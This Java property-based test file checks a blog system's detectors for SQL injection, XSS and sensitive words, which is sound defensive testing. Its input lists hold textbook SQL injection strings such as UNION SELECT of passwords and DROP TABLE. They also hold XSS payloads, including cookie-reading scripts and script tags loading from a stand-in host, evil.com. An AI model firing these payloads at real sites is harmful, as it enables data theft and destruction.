package com.blog.property;

import com.blog.repository.SensitiveWordRepository;
import com.blog.service.impl.SecurityServiceImpl;
import net.jqwik.api.*;

import java.util.Arrays;
import java.util.List;

import static org.junit.jupiter.api.Assertions.*;
import static org.mockito.Mockito.*;

/**
 * SecurityService属性测试
 * 使用jqwik进行基于属性的测试
 */
class SecurityServicePropertyTest {

    /**
     * Feature: personal-blog-system, Property 14: SQL注入防护
     * 验证需求: 11.2
     * 
     * 对于任意包含SQL注入攻击特征的输入，系统应该拒绝请求并记录安全日志
     */
    @Property(tries = 100)
    void testSqlInjectionDetection(
            @ForAll("sqlInjectionPatterns") String sqlInjectionInput) {
        
        // 准备mock对象
        SensitiveWordRepository sensitiveWordRepository = mock(SensitiveWordRepository.class);
        
        // 模拟空的敏感词库（SQL注入检测不依赖敏感词库）
        when(sensitiveWordRepository.findAllWords()).thenReturn(Arrays.asList());
        
        SecurityServiceImpl securityService = new SecurityServiceImpl();
        setField(securityService, "sensitiveWordRepository", sensitiveWordRepository);
        
        // 初始化服务
        securityService.init();
        
        // 属性验证：所有SQL注入模式都应该被检测到
        boolean detected = securityService.containsSqlInjection(sqlInjectionInput);
        
        assertTrue(detected, 
                "SQL injection pattern should be detected: " + sqlInjectionInput);
    }

    /**
     * Feature: personal-blog-system, Property 14: SQL注入防护（正常输入测试）
     * 验证需求: 11.2
     * 
     * 对于任意不包含SQL注入特征的正常输入，系统应该允许通过
     */
    @Property(tries = 100)
    void testNormalInputNotDetectedAsSqlInjection(
            @ForAll("normalInputs") String normalInput) {
        
        // 准备mock对象
        SensitiveWordRepository sensitiveWordRepository = mock(SensitiveWordRepository.class);
        
        when(sensitiveWordRepository.findAllWords()).thenReturn(Arrays.asList());
        
        SecurityServiceImpl securityService = new SecurityServiceImpl();
        setField(securityService, "sensitiveWordRepository", sensitiveWordRepository);
        
        securityService.init();
        
        // 属性验证：正常输入不应该被误判为SQL注入
        boolean detected = securityService.containsSqlInjection(normalInput);
        
        assertFalse(detected, 
                "Normal input should not be detected as SQL injection: " + normalInput);
    }

    /**
     * Feature: personal-blog-system, Property 14: SQL注入防护（组合测试）
     * 验证需求: 11.2
     * 
     * 测试SQL注入检测在各种输入组合下的正确性
     */
    @Property(tries = 100)
    void testSqlInjectionDetectionConsistency(
            @ForAll("sqlKeywords") String sqlKeyword,
            @ForAll("sqlOperators") String operator,
            @ForAll("sqlValues") String value) {
        
        // 准备mock对象
        SensitiveWordRepository sensitiveWordRepository = mock(SensitiveWordRepository.class);
        
        when(sensitiveWordRepository.findAllWords()).thenReturn(Arrays.asList());
        
        SecurityServiceImpl securityService = new SecurityServiceImpl();
        setField(securityService, "sensitiveWordRepository", sensitiveWordRepository);
        
        securityService.init();
        
        // 构造SQL注入模式
        String sqlInjectionPattern = sqlKeyword + " " + operator + " " + value;
        
        // 属性验证：组合的SQL注入模式应该被检测到
        boolean detected = securityService.containsSqlInjection(sqlInjectionPattern);
        
        assertTrue(detected, 
                "Combined SQL injection pattern should be detected: " + sqlInjectionPattern);
    }

    /**
     * Feature: personal-blog-system, Property 14: SQL注入防护（大小写不敏感）
     * 验证需求: 11.2
     * 
     * SQL注入检测应该对大小写不敏感
     */
    @Property(tries = 100)
    void testSqlInjectionDetectionCaseInsensitive(
            @ForAll("sqlInjectionPatterns") String sqlInjectionInput) {
        
        // 准备mock对象
        SensitiveWordRepository sensitiveWordRepository = mock(SensitiveWordRepository.class);
        
        when(sensitiveWordRepository.findAllWords()).thenReturn(Arrays.asList());
        
        SecurityServiceImpl securityService = new SecurityServiceImpl();
        setField(securityService, "sensitiveWordRepository", sensitiveWordRepository);
        
        securityService.init();
        
        // 测试原始输入
        boolean detectedOriginal = securityService.containsSqlInjection(sqlInjectionInput);
        
        // 测试大写版本
        boolean detectedUpperCase = securityService.containsSqlInjection(sqlInjectionInput.toUpperCase());
        
        // 测试小写版本
        boolean detectedLowerCase = securityService.containsSqlInjection(sqlInjectionInput.toLowerCase());
        
        // 属性验证：无论大小写如何，检测结果应该一致
        assertTrue(detectedOriginal, 
                "Original SQL injection should be detected: " + sqlInjectionInput);
        assertTrue(detectedUpperCase, 
                "Uppercase SQL injection should be detected: " + sqlInjectionInput.toUpperCase());
        assertTrue(detectedLowerCase, 
                "Lowercase SQL injection should be detected: " + sqlInjectionInput.toLowerCase());
    }

    /**
     * Feature: personal-blog-system, Property 14: SQL注入防护（空值和null处理）
     * 验证需求: 11.2
     * 
     * 空值和null输入应该被安全处理，不应该抛出异常
     */
    @Property(tries = 100)
    void testSqlInjectionDetectionWithEmptyAndNull() {
        
        // 准备mock对象
        SensitiveWordRepository sensitiveWordRepository = mock(SensitiveWordRepository.class);
        
        when(sensitiveWordRepository.findAllWords()).thenReturn(Arrays.asList());
        
        SecurityServiceImpl securityService = new SecurityServiceImpl();
        setField(securityService, "sensitiveWordRepository", sensitiveWordRepository);
        
        securityService.init();
        
        // 测试null输入
        boolean detectedNull = securityService.containsSqlInjection(null);
        assertFalse(detectedNull, "Null input should return false");
        
        // 测试空字符串
        boolean detectedEmpty = securityService.containsSqlInjection("");
        assertFalse(detectedEmpty, "Empty string should return false");
        
        // 测试空白字符串
        boolean detectedWhitespace = securityService.containsSqlInjection("   ");
        assertFalse(detectedWhitespace, "Whitespace string should return false");
    }

    /**
     * 生成SQL注入攻击模式
     */
    @Provide
    Arbitrary<String> sqlInjectionPatterns() {
        return Arbitraries.of(
            // SQL关键字注入
            "SELECT * FROM users",
            "INSERT INTO users VALUES",
            "UPDATE users SET password",
            "DELETE FROM users",
            "DROP TABLE users",
            "CREATE TABLE malicious",
            "ALTER TABLE users",
            "UNION SELECT password",
            "EXEC sp_executesql",
            "EXECUTE sp_executesql",
            
            // OR/AND注入
            "1' OR '1'='1",
            "1' OR 1=1--",
            "admin' OR 1=1--",
            "' OR '1'='1",
            "' OR 'a'='a",
            "1 OR 1=1",
            "1 AND 1=1",
            "' AND '1'='1",
            "admin' AND 1=1--",
            
            // 注释符注入
            "admin'--",
            "admin'/*",
            "'; DROP TABLE users--",
            "1'; DROP TABLE users--",
            
            // 布尔注入
            "' OR true--",
            "' AND true--",
            "' OR false--",
            "1 OR true",
            "1 AND false",
            
            // 数字比较注入
            "1 OR 1>0",
            "1 AND 1<2",
            "' OR 1>0--",
            "' AND 1<2--",
            
            // 联合查询注入
            "UNION SELECT username, password FROM users",
            "' UNION SELECT NULL, NULL--",
            "1 UNION SELECT * FROM admin",
            
            // 类型转换注入
            "CAST(password AS varchar)",
            "CONVERT(varchar, password)",
            
            // 声明变量注入
            "DECLARE @var varchar(100)",
            
            // 分号分隔注入
            "; SELECT * FROM users",
            "; DROP TABLE users",
            "; INSERT INTO admin"
        );
    }

    /**
     * 生成正常的用户输入（不包含SQL注入特征）
     */
    @Provide
    Arbitrary<String> normalInputs() {
        return Arbitraries.of(
            // 正常的文章标题
            "如何学习Java编程",
            "Spring Boot入门教程",
            "数据库设计最佳实践",
            "前端开发技巧分享",
            
            // 正常的用户名
            "admin",
            "user123",
            "blogger_2025",
            "test_user",
            
            // 正常的评论内容
            "这篇文章写得很好",
            "感谢分享",
            "学到了很多知识",
            "期待更多内容",
            
            // 正常的搜索关键词
            "Java",
            "Spring",
            "数据库",
            "前端",
            
            // 包含特殊字符但不是SQL注入的内容
            "价格: $100",
            "邮箱: user@example.com",
            "电话: 13800138000",
            "地址: 北京市朝阳区",
            
            // 正常的技术术语
            "RESTful API",
            "JSON格式",
            "HTTP请求",
            "MVC架构"
        );
    }

    /**
     * 生成SQL关键字
     */
    @Provide
    Arbitrary<String> sqlKeywords() {
        return Arbitraries.of(
            "SELECT",
            "INSERT",
            "UPDATE",
            "DELETE",
            "DROP",
            "CREATE",
            "ALTER",
            "UNION",
            "EXEC",
            "EXECUTE"
        );
    }

    /**
     * 生成SQL操作符
     */
    @Provide
    Arbitrary<String> sqlOperators() {
        return Arbitraries.of(
            "OR",
            "AND",
            "=",
            ">",
            "<",
            ">=",
            "<=",
            "!="
        );
    }

    /**
     * 生成SQL值
     */
    @Provide
    Arbitrary<String> sqlValues() {
        return Arbitraries.of(
            "1=1",
            "'1'='1'",
            "true",
            "false",
            "1",
            "'admin'",
            "NULL"
        );
    }

    /**
     * Feature: personal-blog-system, Property 15: XSS攻击防护
     * 验证需求: 11.3
     * 
     * 对于任意包含XSS攻击特征的输入，系统应该检测到XSS攻击
     */
    @Property(tries = 100)
    void testXssAttackDetection(
            @ForAll("xssAttackPatterns") String xssInput) {
        
        // 准备mock对象
        SensitiveWordRepository sensitiveWordRepository = mock(SensitiveWordRepository.class);
        
        // 模拟空的敏感词库（XSS检测不依赖敏感词库）
        when(sensitiveWordRepository.findAllWords()).thenReturn(Arrays.asList());
        
        SecurityServiceImpl securityService = new SecurityServiceImpl();
        setField(securityService, "sensitiveWordRepository", sensitiveWordRepository);
        
        // 初始化服务
        securityService.init();
        
        // 属性验证：所有XSS攻击模式都应该被检测到
        boolean detected = securityService.containsXss(xssInput);
        
        assertTrue(detected, 
                "XSS attack pattern should be detected: " + xssInput);
    }

    /**
     * Feature: personal-blog-system, Property 15: XSS攻击防护（正常输入测试）
     * 验证需求: 11.3
     * 
     * 对于任意不包含XSS攻击特征的正常输入，系统应该允许通过
     */
    @Property(tries = 100)
    void testNormalInputNotDetectedAsXss(
            @ForAll("normalInputs") String normalInput) {
        
        // 准备mock对象
        SensitiveWordRepository sensitiveWordRepository = mock(SensitiveWordRepository.class);
        
        when(sensitiveWordRepository.findAllWords()).thenReturn(Arrays.asList());
        
        SecurityServiceImpl securityService = new SecurityServiceImpl();
        setField(securityService, "sensitiveWordRepository", sensitiveWordRepository);
        
        securityService.init();
        
        // 属性验证：正常输入不应该被误判为XSS攻击
        boolean detected = securityService.containsXss(normalInput);
        
        assertFalse(detected, 
                "Normal input should not be detected as XSS attack: " + normalInput);
    }

    /**
     * Feature: personal-blog-system, Property 15: XSS攻击防护（转义处理）
     * 验证需求: 11.3
     * 
     * 对于任意包含HTML特殊字符的输入，系统应该正确进行转义处理
     */
    @Property(tries = 100)
    void testXssEscaping(
            @ForAll("htmlSpecialCharacters") String htmlInput) {
        
        // 准备mock对象
        SensitiveWordRepository sensitiveWordRepository = mock(SensitiveWordRepository.class);
        
        when(sensitiveWordRepository.findAllWords()).thenReturn(Arrays.asList());
        
        SecurityServiceImpl securityService = new SecurityServiceImpl();
        setField(securityService, "sensitiveWordRepository", sensitiveWordRepository);
        
        securityService.init();
        
        // 执行转义
        String escaped = securityService.escapeXss(htmlInput);
        
        // 属性验证：转义后的字符串不应该包含原始的HTML特殊字符
        assertNotNull(escaped, "Escaped output should not be null");
        
        // 验证特殊字符被转义
        if (htmlInput.contains("<")) {
            assertTrue(escaped.contains("&lt;"), 
                    "< should be escaped to &lt;");
        }
        if (htmlInput.contains(">")) {
            assertTrue(escaped.contains("&gt;"), 
                    "> should be escaped to &gt;");
        }
        if (htmlInput.contains("&")) {
            assertTrue(escaped.contains("&amp;"), 
                    "& should be escaped to &amp;");
        }
        if (htmlInput.contains("\"")) {
            assertTrue(escaped.contains("&quot;"), 
                    "\" should be escaped to &quot;");
        }
        if (htmlInput.contains("'")) {
            assertTrue(escaped.contains("&#39;"), 
                    "' should be escaped to &#39;");
        }
    }

    /**
     * Feature: personal-blog-system, Property 15: XSS攻击防护（大小写不敏感）
     * 验证需求: 11.3
     * 
     * XSS攻击检测应该对大小写不敏感
     */
    @Property(tries = 100)
    void testXssDetectionCaseInsensitive(
            @ForAll("xssAttackPatterns") String xssInput) {
        
        // 准备mock对象
        SensitiveWordRepository sensitiveWordRepository = mock(SensitiveWordRepository.class);
        
        when(sensitiveWordRepository.findAllWords()).thenReturn(Arrays.asList());
        
        SecurityServiceImpl securityService = new SecurityServiceImpl();
        setField(securityService, "sensitiveWordRepository", sensitiveWordRepository);
        
        securityService.init();
        
        // 测试原始输入
        boolean detectedOriginal = securityService.containsXss(xssInput);
        
        // 测试大写版本
        boolean detectedUpperCase = securityService.containsXss(xssInput.toUpperCase());
        
        // 测试小写版本
        boolean detectedLowerCase = securityService.containsXss(xssInput.toLowerCase());
        
        // 属性验证：无论大小写如何，检测结果应该一致
        assertTrue(detectedOriginal, 
                "Original XSS attack should be detected: " + xssInput);
        assertTrue(detectedUpperCase, 
                "Uppercase XSS attack should be detected: " + xssInput.toUpperCase());
        assertTrue(detectedLowerCase, 
                "Lowercase XSS attack should be detected: " + xssInput.toLowerCase());
    }

    /**
     * Feature: personal-blog-system, Property 15: XSS攻击防护（空值和null处理）
     * 验证需求: 11.3
     * 
     * 空值和null输入应该被安全处理，不应该抛出异常
     */
    @Property(tries = 100)
    void testXssDetectionWithEmptyAndNull() {
        
        // 准备mock对象
        SensitiveWordRepository sensitiveWordRepository = mock(SensitiveWordRepository.class);
        
        when(sensitiveWordRepository.findAllWords()).thenReturn(Arrays.asList());
        
        SecurityServiceImpl securityService = new SecurityServiceImpl();
        setField(securityService, "sensitiveWordRepository", sensitiveWordRepository);
        
        securityService.init();
        
        // 测试null输入
        boolean detectedNull = securityService.containsXss(null);
        assertFalse(detectedNull, "Null input should return false");
        
        // 测试空字符串
        boolean detectedEmpty = securityService.containsXss("");
        assertFalse(detectedEmpty, "Empty string should return false");
        
        // 测试空白字符串
        boolean detectedWhitespace = securityService.containsXss("   ");
        assertFalse(detectedWhitespace, "Whitespace string should return false");
        
        // 测试null转义
        String escapedNull = securityService.escapeXss(null);
        assertNull(escapedNull, "Escaping null should return null");
    }

    /**
     * Feature: personal-blog-system, Property 15: XSS攻击防护（转义幂等性）
     * 验证需求: 11.3
     * 
     * 对已转义的内容再次转义应该保持一致性
     */
    @Property(tries = 100)
    void testXssEscapingIdempotence(
            @ForAll("htmlSpecialCharacters") String htmlInput) {
        
        // 准备mock对象
        SensitiveWordRepository sensitiveWordRepository = mock(SensitiveWordRepository.class);
        
        when(sensitiveWordRepository.findAllWords()).thenReturn(Arrays.asList());
        
        SecurityServiceImpl securityService = new SecurityServiceImpl();
        setField(securityService, "sensitiveWordRepository", sensitiveWordRepository);
        
        securityService.init();
        
        // 第一次转义
        String escaped1 = securityService.escapeXss(htmlInput);
        
        // 第二次转义
        String escaped2 = securityService.escapeXss(escaped1);
        
        // 属性验证：多次转义应该产生不同的结果（因为&会被转义为&amp;）
        assertNotNull(escaped1, "First escape should not be null");
        assertNotNull(escaped2, "Second escape should not be null");
        
        // 如果原始输入包含&，第二次转义会将&amp;转义为&amp;amp;
        if (htmlInput.contains("&") || htmlInput.contains("<") || htmlInput.contains(">")) {
            assertNotEquals(escaped1, escaped2, 
                    "Multiple escaping should produce different results for inputs with special chars");
        }
    }

    /**
     * 生成XSS攻击模式
     */
    @Provide
    Arbitrary<String> xssAttackPatterns() {
        return Arbitraries.of(
            // Script标签注入
            "<script>alert('XSS')</script>",
            "<script>alert(document.cookie)</script>",
            "<script src='http://evil.com/xss.js'></script>",
            "<script>window.location='http://evil.com'</script>",
            "<SCRIPT>alert('XSS')</SCRIPT>",
            
            // 事件处理器注入
            "<img src=x onerror=alert('XSS')>",
            "<img src=x onload=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<div onclick=alert('XSS')>Click me</div>",
            "<a href='#' onmouseover=alert('XSS')>Hover me</a>",
            
            // JavaScript伪协议
            "<a href='javascript:alert(\"XSS\")'>Click</a>",
            "<iframe src='javascript:alert(\"XSS\")'></iframe>",
            
            // VBScript伪协议
            "<a href='vbscript:msgbox(\"XSS\")'>Click</a>",
            
            // Data URI
            "<a href='data:text/html,<script>alert(\"XSS\")</script>'>Click</a>",
            
            // Iframe注入
            "<iframe src='http://evil.com'></iframe>",
            "<iframe src='javascript:alert(\"XSS\")'></iframe>",
            
            // Object和Embed注入
            "<object data='http://evil.com/xss.swf'></object>",
            "<embed src='http://evil.com/xss.swf'>",
            
            // Applet注入
            "<applet code='XSS.class'></applet>",
            
            // Eval注入
            "<img src=x onerror='eval(atob(\"YWxlcnQoJ1hTUycp\"))'>",
            
            // Expression注入（IE）
            "<div style='width:expression(alert(\"XSS\"))'>",
            
            // 混合大小写绕过
            "<ScRiPt>alert('XSS')</ScRiPt>",
            "<iMg sRc=x OnErRoR=alert('XSS')>",
            
            // 空格和换行绕过
            "<img\nsrc=x\nonerror=alert('XSS')>",
            "<img\tsrc=x\tonerror=alert('XSS')>",
            
            // 编码绕过
            "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;('XSS')>",
            
            // SVG注入
            "<svg onload=alert('XSS')></svg>",
            "<svg><script>alert('XSS')</script></svg>"
        );
    }

    /**
     * 生成包含HTML特殊字符的输入
     */
    @Provide
    Arbitrary<String> htmlSpecialCharacters() {
        return Arbitraries.of(
            // 单个特殊字符
            "<",
            ">",
            "&",
            "\"",
            "'",
            
            // 组合特殊字符
            "<div>",
            "</div>",
            "<p>Hello</p>",
            "<a href='#'>Link</a>",
            "Tom & Jerry",
            "Price: $100 & up",
            "He said \"Hello\"",
            "It's a test",
            
            // 包含多种特殊字符
            "<div class=\"test\" id='main'>Content & more</div>",
            "A < B && B > C",
            "\"Quote\" & 'Apostrophe' < Tag >",
            
            // 正常HTML标签（应该被转义）
            "<b>Bold</b>",
            "<i>Italic</i>",
            "<u>Underline</u>",
            "<strong>Strong</strong>",
            "<em>Emphasis</em>",
            
            // 包含属性的标签
            "<img src='image.jpg' alt='Image'>",
            "<a href='http://example.com' target='_blank'>Link</a>",
            
            // 嵌套标签
            "<div><p><span>Nested</span></p></div>"
        );
    }

    /**
     * Feature: personal-blog-system, Property 18: 敏感词内容拒绝
     * 验证需求: 25.2
     * 
     * 对于任意包含敏感词的文章、评论或私信，系统应该检测到敏感词
     */
    @Property(tries = 100)
    void testSensitiveWordDetection(
            @ForAll("sensitiveWords") String sensitiveWord,
            @ForAll("normalContent") String normalContent) {
        
        // 准备mock对象
        SensitiveWordRepository sensitiveWordRepository = mock(SensitiveWordRepository.class);
        
        // 模拟敏感词库
        List<String> sensitiveWordList = Arrays.asList(
            "辱骂词1", "辱骂词2", "色情词1", "色情词2", "暴力词1", "暴力词2",
            "政治敏感词1", "政治敏感词2", "违禁词1", "违禁词2"
        );
        when(sensitiveWordRepository.findAllWords()).thenReturn(sensitiveWordList);
        
        SecurityServiceImpl securityService = new SecurityServiceImpl();
        setField(securityService, "sensitiveWordRepository", sensitiveWordRepository);
        
        // 初始化服务（加载敏感词到AC自动机）
        securityService.init();
        
        // 构造包含敏感词的内容
        String contentWithSensitiveWord = normalContent + sensitiveWord + normalContent;
        
        // 属性验证：包含敏感词的内容应该被检测到
        boolean detected = securityService.containsSensitiveWord(contentWithSensitiveWord);
        
        assertTrue(detected, 
                "Content with sensitive word should be detected: " + sensitiveWord);
        
        // 验证能找到敏感词
        List<String> foundWords = securityService.findSensitiveWords(contentWithSensitiveWord);
        assertFalse(foundWords.isEmpty(), 
                "Should find at least one sensitive word");
        assertTrue(foundWords.contains(sensitiveWord), 
                "Should find the specific sensitive word: " + sensitiveWord);
    }

    /**
     * Feature: personal-blog-system, Property 18: 敏感词内容拒绝（纯净内容测试）
     * 验证需求: 25.2
     * 
     * 对于任意不包含敏感词的正常内容，系统应该允许通过
     */
    @Property(tries = 100)
    void testCleanContentNotDetectedAsSensitive(
            @ForAll("cleanContent") String cleanContent) {
        
        // 准备mock对象
        SensitiveWordRepository sensitiveWordRepository = mock(SensitiveWordRepository.class);
        
        // 模拟敏感词库
        List<String> sensitiveWordList = Arrays.asList(
            "辱骂词1", "辱骂词2", "色情词1", "色情词2", "暴力词1", "暴力词2",
            "政治敏感词1", "政治敏感词2", "违禁词1", "违禁词2"
        );
        when(sensitiveWordRepository.findAllWords()).thenReturn(sensitiveWordList);
        
        SecurityServiceImpl securityService = new SecurityServiceImpl();
        setField(securityService, "sensitiveWordRepository", sensitiveWordRepository);
        
        securityService.init();
        
        // 属性验证：纯净内容不应该被检测为包含敏感词
        boolean detected = securityService.containsSensitiveWord(cleanContent);
        
        assertFalse(detected, 
                "Clean content should not be detected as sensitive: " + cleanContent);
        
        // 验证找不到敏感词
        List<String> foundWords = securityService.findSensitiveWords(cleanContent);
        assertTrue(foundWords.isEmpty(), 
                "Should not find any sensitive words in clean content");
    }

    /**
     * Feature: personal-blog-system, Property 18: 敏感词内容拒绝（多个敏感词）
     * 验证需求: 25.2
     * 
     * 对于包含多个敏感词的内容，系统应该检测到所有敏感词
     */
    @Property(tries = 100)
    void testMultipleSensitiveWordsDetection(
            @ForAll("sensitiveWords") String sensitiveWord1,
            @ForAll("sensitiveWords") String sensitiveWord2,
            @ForAll("normalContent") String normalContent) {
        
        // 准备mock对象
        SensitiveWordRepository sensitiveWordRepository = mock(SensitiveWordRepository.class);
        
        // 模拟敏感词库
        List<String> sensitiveWordList = Arrays.asList(
            "辱骂词1", "辱骂词2", "色情词1", "色情词2", "暴力词1", "暴力词2",
            "政治敏感词1", "政治敏感词2", "违禁词1", "违禁词2"
        );
        when(sensitiveWordRepository.findAllWords()).thenReturn(sensitiveWordList);
        
        SecurityServiceImpl securityService = new SecurityServiceImpl();
        setField(securityService, "sensitiveWordRepository", sensitiveWordRepository);
        
        securityService.init();
        
        // 构造包含多个敏感词的内容
        String contentWithMultipleSensitiveWords = 
            normalContent + sensitiveWord1 + normalContent + sensitiveWord2 + normalContent;
        
        // 属性验证：包含多个敏感词的内容应该被检测到
        boolean detected = securityService.containsSensitiveWord(contentWithMultipleSensitiveWords);
        
        assertTrue(detected, 
                "Content with multiple sensitive words should be detected");
        
        // 验证能找到所有敏感词
        List<String> foundWords = securityService.findSensitiveWords(contentWithMultipleSensitiveWords);
        assertFalse(foundWords.isEmpty(), 
                "Should find at least one sensitive word");
        
        // 如果两个敏感词不同，应该都能被找到
        if (!sensitiveWord1.equals(sensitiveWord2)) {
            assertTrue(foundWords.contains(sensitiveWord1) || foundWords.contains(sensitiveWord2), 
                    "Should find at least one of the sensitive words");
        }
    }

    /**
     * Feature: personal-blog-system, Property 18: 敏感词内容拒绝（位置无关性）
     * 验证需求: 25.2
     * 
     * 敏感词在内容中的位置不应该影响检测结果
     */
    @Property(tries = 100)
    void testSensitiveWordDetectionPositionIndependent(
            @ForAll("sensitiveWords") String sensitiveWord,
            @ForAll("normalContent") String prefix,
            @ForAll("normalContent") String suffix) {
        
        // 准备mock对象
        SensitiveWordRepository sensitiveWordRepository = mock(SensitiveWordRepository.class);
        
        // 模拟敏感词库
        List<String> sensitiveWordList = Arrays.asList(
            "辱骂词1", "辱骂词2", "色情词1", "色情词2", "暴力词1", "暴力词2",
            "政治敏感词1", "政治敏感词2", "违禁词1", "违禁词2"
        );
        when(sensitiveWordRepository.findAllWords()).thenReturn(sensitiveWordList);
        
        SecurityServiceImpl securityService = new SecurityServiceImpl();
        setField(securityService, "sensitiveWordRepository", sensitiveWordRepository);
        
        securityService.init();
        
        // 测试敏感词在开头
        String contentAtStart = sensitiveWord + prefix + suffix;
        boolean detectedAtStart = securityService.containsSensitiveWord(contentAtStart);
        assertTrue(detectedAtStart, 
                "Sensitive word at start should be detected");
        
        // 测试敏感词在中间
        String contentInMiddle = prefix + sensitiveWord + suffix;
        boolean detectedInMiddle = securityService.containsSensitiveWord(contentInMiddle);
        assertTrue(detectedInMiddle, 
                "Sensitive word in middle should be detected");
        
        // 测试敏感词在结尾
        String contentAtEnd = prefix + suffix + sensitiveWord;
        boolean detectedAtEnd = securityService.containsSensitiveWord(contentAtEnd);
        assertTrue(detectedAtEnd, 
                "Sensitive word at end should be detected");
    }

    /**
     * Feature: personal-blog-system, Property 18: 敏感词内容拒绝（空值和null处理）
     * 验证需求: 25.2
     * 
     * 空值和null输入应该被安全处理，不应该抛出异常
     */
    @Property(tries = 100)
    void testSensitiveWordDetectionWithEmptyAndNull() {
        
        // 准备mock对象
        SensitiveWordRepository sensitiveWordRepository = mock(SensitiveWordRepository.class);
        
        // 模拟敏感词库
        List<String> sensitiveWordList = Arrays.asList(
            "辱骂词1", "辱骂词2", "色情词1", "色情词2"
        );
        when(sensitiveWordRepository.findAllWords()).thenReturn(sensitiveWordList);
        
        SecurityServiceImpl securityService = new SecurityServiceImpl();
        setField(securityService, "sensitiveWordRepository", sensitiveWordRepository);
        
        securityService.init();
        
        // 测试null输入
        boolean detectedNull = securityService.containsSensitiveWord(null);
        assertFalse(detectedNull, "Null input should return false");
        
        List<String> foundWordsNull = securityService.findSensitiveWords(null);
        assertTrue(foundWordsNull.isEmpty(), "Null input should return empty list");
        
        // 测试空字符串
        boolean detectedEmpty = securityService.containsSensitiveWord("");
        assertFalse(detectedEmpty, "Empty string should return false");
        
        List<String> foundWordsEmpty = securityService.findSensitiveWords("");
        assertTrue(foundWordsEmpty.isEmpty(), "Empty string should return empty list");
        
        // 测试空白字符串
        boolean detectedWhitespace = securityService.containsSensitiveWord("   ");
        assertFalse(detectedWhitespace, "Whitespace string should return false");
    }

    /**
     * Feature: personal-blog-system, Property 18: 敏感词内容拒绝（重复敏感词）
     * 验证需求: 25.2
     * 
     * 内容中重复出现的敏感词应该被全部检测到
     */
    @Property(tries = 100)
    void testRepeatedSensitiveWordDetection(
            @ForAll("sensitiveWords") String sensitiveWord,
            @ForAll("normalContent") String separator) {
        
        // 准备mock对象
        SensitiveWordRepository sensitiveWordRepository = mock(SensitiveWordRepository.class);
        
        // 模拟敏感词库
        List<String> sensitiveWordList = Arrays.asList(
            "辱骂词1", "辱骂词2", "色情词1", "色情词2", "暴力词1", "暴力词2",
            "政治敏感词1", "政治敏感词2", "违禁词1", "违禁词2"
        );
        when(sensitiveWordRepository.findAllWords()).thenReturn(sensitiveWordList);
        
        SecurityServiceImpl securityService = new SecurityServiceImpl();
        setField(securityService, "sensitiveWordRepository", sensitiveWordRepository);
        
        securityService.init();
        
        // 构造包含重复敏感词的内容
        String contentWithRepeatedSensitiveWord = 
            sensitiveWord + separator + sensitiveWord + separator + sensitiveWord;
        
        // 属性验证：包含重复敏感词的内容应该被检测到
        boolean detected = securityService.containsSensitiveWord(contentWithRepeatedSensitiveWord);
        
        assertTrue(detected, 
                "Content with repeated sensitive word should be detected");
        
        // 验证能找到所有出现的敏感词
        List<String> foundWords = securityService.findSensitiveWords(contentWithRepeatedSensitiveWord);
        assertFalse(foundWords.isEmpty(), 
                "Should find the repeated sensitive words");
        
        // 应该找到多次出现（AC自动机会找到所有匹配）
        long count = foundWords.stream().filter(w -> w.equals(sensitiveWord)).count();
        assertTrue(count >= 1, 
                "Should find at least one occurrence of the sensitive word");
    }

    /**
     * 生成敏感词
     */
    @Provide
    Arbitrary<String> sensitiveWords() {
        return Arbitraries.of(
            "辱骂词1",
            "辱骂词2",
            "色情词1",
            "色情词2",
            "暴力词1",
            "暴力词2",
            "政治敏感词1",
            "政治敏感词2",
            "违禁词1",
            "违禁词2"
        );
    }

    /**
     * 生成正常内容片段
     */
    @Provide
    Arbitrary<String> normalContent() {
        return Arbitraries.of(
            "这是一篇关于技术的文章",
            "今天天气很好",
            "我喜欢编程",
            "学习使我快乐",
            "分享知识",
            "欢迎讨论",
            "感谢阅读",
            "期待交流",
            " ",
            "，",
            "。"
        );
    }

    /**
     * 生成纯净内容（不包含敏感词）
     */
    @Provide
    Arbitrary<String> cleanContent() {
        return Arbitraries.of(
            // 技术文章内容
            "这是一篇关于Java编程的技术文章",
            "Spring Boot框架的使用方法",
            "数据库设计的最佳实践",
            "前端开发技巧分享",
            "如何学习编程语言",
            
            // 评论内容
            "这篇文章写得很好，学到了很多",
            "感谢作者的分享",
            "内容很有价值",
            "期待更多优质内容",
            "非常实用的教程",
            
            // 私信内容
            "你好，我对你的文章很感兴趣",
            "能否请教一个技术问题",
            "感谢你的帮助",
            "期待你的回复",
            
            // 正常的中文句子
            "今天天气很好",
            "我喜欢阅读和写作",
            "学习使我进步",
            "分享知识是一件快乐的事",
            "欢迎大家一起讨论",
            
            // 包含标点符号的内容
            "你好！欢迎来到我的博客。",
            "这是一个测试内容，包含标点符号：逗号、句号、感叹号！",
            "问题：如何学习编程？答案：多练习。",
            
            // 包含数字和英文的内容
            "Java 8的新特性介绍",
            "Spring Boot 2.7版本更新",
            "MySQL 8.0数据库配置",
            "Vue.js 3.0前端框架",
            
            // 空内容
            "",
            " ",
            "  "
        );
    }

    /**
     * 使用反射设置私有字段
     */
    private void setField(Object target, String fieldName, Object value) {
        try {
            java.lang.reflect.Field field = target.getClass().getDeclaredField(fieldName);
            field.setAccessible(true);
            field.set(target, value);
        } catch (Exception e) {
            throw new RuntimeException("Failed to set field: " + fieldName, e);
        }
    }
}
